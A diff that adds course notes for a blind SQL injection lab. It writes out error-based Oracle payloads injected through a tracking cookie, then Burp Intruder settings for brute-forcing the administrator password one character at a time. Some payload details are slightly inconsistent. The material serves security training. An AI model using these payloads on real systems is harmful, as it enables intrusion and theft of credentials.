@@ -4,6 +4,51 @@ https://ranakhalil.teachable.com/courses/1491236/lectures/34259911
 
 
 Goal: 
+    - Output the administrator password
+    - Login as the administrator user
 
 Analysis:
 ---------
+
+Vulnerable Parameter - tracking cookie
+Can't use union based SQLi because the SQL query does not returned any data.
+
+1) Prove that parameter is vulnerable: 
+
+    Provide a valid SQL Query
+    ' || (select '') || '   => 500 error test for oracle db
+    ' || (select '' from dual) || ' => 200 success - Indicates this is a oracle database. (True Statement)
+    Provide a invalid table name to ensure its vulnerable to SQLi
+    ' || (select '' from dualtest) || ' => 500 success - Indicates this is a oracle database. (False Statement)
+
+2) Confirm that the users table exist in the database:
+    ' || (select '' from users) || ' => The result for this query is more than 1 row and we should always limit it to 1 row
+    ' || (select '' from users where rownum = 1) || ' => 200 success - Users table exist
+
+3) Confirm that the administrator user exists in the users database:
+    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) END FROM dual) || ' => When statement is true prompt an error.
+
+    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) END FROM users where username = 'administrator') || ' (The where claus is always evaluated first)
+
+
+4) Determine password length:
+    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) END FROM users where username = 'administrator' and LENGTH(password) > 1) || '
+    
+5) Enumerate password:
+    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) END FROM users where username = 'administrator' and substr(password,1,1) = 'a') || ' => if 200 response a is not the first character
+         - Use Burp Suite Intruder
+        Burp Suite Steps to get password
+            1) Send request to Intruder
+            2) Attack Type: Cluster bomb
+            3) Select Payloads 
+                - select substring(password,$1$,1)
+                    * Payload Type: Numbers
+                    * Type: Sequential
+                    * From: 1
+                    * To: 20
+                - ='administrator') = '$a$'--
+                    * Payload Type: Brute Forcer
+                    * Character set: abcdefghijklmnopqrstuvwxyz0123456789
+                    * Min length: 1
+                    * Max length: 1
+
